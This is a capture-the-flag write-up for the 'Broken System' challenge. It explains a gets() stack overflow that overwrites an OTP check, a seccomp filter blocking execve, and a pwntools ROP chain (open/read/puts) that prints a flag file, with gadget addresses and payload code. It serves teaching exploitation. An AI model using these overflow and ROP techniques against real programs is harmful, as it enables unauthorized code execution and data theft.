# Broken System Writeup

## Reversing

We're given a statically linked binary, which prompts the user for a username.
Compares the inputted username against `"admin"`, if equal it calls `recovery_console()`, otherwise it just exits.

In `recovery_console()`, it first:
1. Gets a random 32-byte string using `/dev/urandom`.
2. Hashes it using sha256.
3. Prints the hash.

Then it asks the user for a OTP (One Time Password), which should be the initial hashed string.
If wrong, it will call `exit()`.

The only information we have about this string is its hash, and it should be theoretically impossible to reverse the hash, so at first glance this seems impossible to pass.

Notably however, it uses `gets()` to read in the OTP (hex, which is then converts to bytes), which is a stack overflow.
So if we can force this function to return, we'd be able to get ROP.

## Seccomp

Afterwards, it calls `system("recovery_console")`, which isn't a command that exists, and when this fails, it calls `load_seccomp()`.
This installs a Secure Computing (seccomp) filter, which restricts the usage of certain syscalls, in particular [execve](https://man7.org/linux/man-pages/man2/execve.2.html) and [execveat](https://man7.org/linux/man-pages/man2/execveat.2.html).
We can see this by using [seccomp-tools](https://github.com/david942j/seccomp-tools): extract the `sock_filter` variable, copy it to a file (e.g. `bpf`), and run:
```
$ seccomp-tools disasm bpf
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```
(Another common way of doing this is `seccomp-tools dump ./BINARY`, which runs the program, and once it installs the filter, it will print it out, but that's more inconvenient here, as you need to bypass the check first to reach the seccomp filter).

The above is a bpf program, and we can see that if the `sys_number` is `execve` or `execveat`, then it jumps to `KILL_PROCESS`, otherwise it falls through to `ALLOW`.

These syscalls run new programs, and `execve` in particular is a core syscall in the `system()` function, so calling `system("/bin/sh")` like you normally would doesn't work anymore, instead the program would just crash.

## Bypass password check

We can use the overflow in `gets()` to bypass the impossible check.
By looking at the disassembly, we see that `gets()` reads into a buffer at `[rbp-0x90]`.
```
   0x0000000000402708 <+194>:	lea    rax,[rbp-0x90]       <---
   0x000000000040270f <+201>:	mov    rdi,rax
   0x0000000000402712 <+204>:	mov    eax,0x0
   0x0000000000402717 <+209>:	call   0x41ab60 <gets>
```
And that the random password is at `[rbp-0x30]`.
```
   0x000000000040268e <+72>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000402692 <+76>:	lea    rax,[rbp-0x30]       <---
   0x0000000000402696 <+80>:	mov    rcx,rdx
   0x0000000000402699 <+83>:	mov    edx,0x1
   0x000000000040269e <+88>:	mov    esi,0x20
   0x00000000004026a3 <+93>:	mov    rdi,rax
   0x00000000004026a6 <+96>:	call   0x41aa60 <fread>
```
This means the password is `0x60` bytes after our buffer, meaning we can overwrite the original password at the same time of filling the hex buffer, so we can force these to match.
```py
otp = b"A"*0x20

payload = otp.hex().encode() + b"\x00"
payload = payload.ljust(0x60, b"B")
payload += otp
```

## ROP

All we need to do to solve the challenge is to read the flag file, and we don't need a shell for that.
Instead, we can just do:
```c
fd = open("flag.txt", O_RDONLY);
read(fd, buf, 0x100);
puts(buf);
```
To do this, we'll need to be able to control the first 3 arguments (stored in `rdi`, `rsi`, `rdx`), and have access to `open()`, `read()`, `puts()`.

Since it's statically linked with glibc, we have access to all those functions (`read` and `puts` are also already used in the main program).
To control `rdi`, `rsi`, `rdx`, we can use `ROPgadget` to find suitable gadgets:
```
$ ROPgadget --binary ./broken_system | grep ret$ | grep "pop rdi"
...
0x0000000000402f90 : pop rdi ; ret
...

$ ROPgadget --binary ./broken_system | grep ret$ | grep "pop rsi"
...
0x0000000000410b72 : pop rsi ; ret

$ ROPgadget --binary ./broken_system | grep ret$ | grep "pop rdx"
...
0x0000000000487ea7 : pop rdx ; pop rbx ; ret
...
```

As for getting the string `"flag.txt"` into memory, we can use a neat trick, which is using `gets()` on an unused section of writable memory, and after we send the rop chain, we then do `p.sendline(b"flag.txt")`.

We also need to know the `fd` of the opened file for the `read()`.
One way is to find some kind of `mov rdi, rax` gadget, but the easiest is fixing it to `3`.
Since `0`, `1`, `2` are already used for `stdin`, `stdout`, `stderr`, the next number will always be `3`.

Putting this all together, we get the following ROP chain.
```py
payload += b"C"*0x10
payload += p64(0)   # rbp
# gets(scratch): read flag filename into memory
payload += p64(pop_rdi) + p64(scratch)
payload += p64(e.sym.gets)
# open(scratch, 0, 0)
payload += p64(pop_rdi) + p64(scratch)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0)*2
payload += p64(e.sym.open64)
# read(3, scratch, 0x100)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(scratch)
payload += p64(pop_rdx_rbx) + p64(0x100)*2
payload += p64(e.sym.read)
# puts(scratch)
payload += p64(pop_rdi) + p64(scratch)
payload += p64(e.sym.puts)
# exit(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(e.sym.exit)

assert b"\n" not in payload
```

Then send everything off:
```py
p.sendlineafter(b"Enter username: ", b"admin")
p.sendlineafter(b"Welcome admin, please enter your OTP\n> ", payload)
p.sendline(b"flag.txt")
```

## Solve script

In [solve.py](solve.py)